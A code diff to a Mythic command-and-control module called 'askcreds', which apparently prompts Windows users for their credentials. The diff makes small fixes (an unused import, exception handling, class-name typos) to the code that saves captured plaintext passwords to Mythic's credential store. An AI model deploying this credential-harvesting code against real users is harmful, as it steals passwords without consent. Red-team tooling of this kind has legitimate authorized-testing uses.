@@ -1,6 +1,5 @@
 from mythic_container.MythicRPC import *
 from mythic_container.MythicCommandBase import *
-import json
 
 class AskCredsArguments(TaskArguments):
     def __init__(self, command_line, **kwargs):
@@ -23,7 +22,7 @@ class AskCredsArguments(TaskArguments):
             if self.command_line[0] == "{":
                 try:
                     self.load_args_from_json_string(self.command_line)
-                except:
+                except Exception:
                     raise ValueError("Unable to parse JSON from command line")
             else:
                 self.set_arg("reason", self.command_line)
@@ -136,16 +135,15 @@ class AskCredsCommand(CommandBase):
                     account = credentials['username']
                 
                 # Credential in Mythic's store (optional - uncomment if you want this)
-                await SendMythicRPCCredentialCreate(MythicRPCcredentialCreateMessage(
+                await SendMythicRPCCredentialCreate(MythicRPCCredentialCreateMessage(
                     TaskID=task.Task.ID,
                     Credentials=[
-                        MythicRPCcredentialData(
+                        MythicRPCCredentialData(
                             credential_type="plaintext",
                             account=account,
                             realm=credentials.get('domain', ''),
                             credential=credentials['password'],
                             comment="Captured via askcreds command",
-                            metadata={"captured_from": "windows_credential_ui"}
                         )
                     ]
                 ))
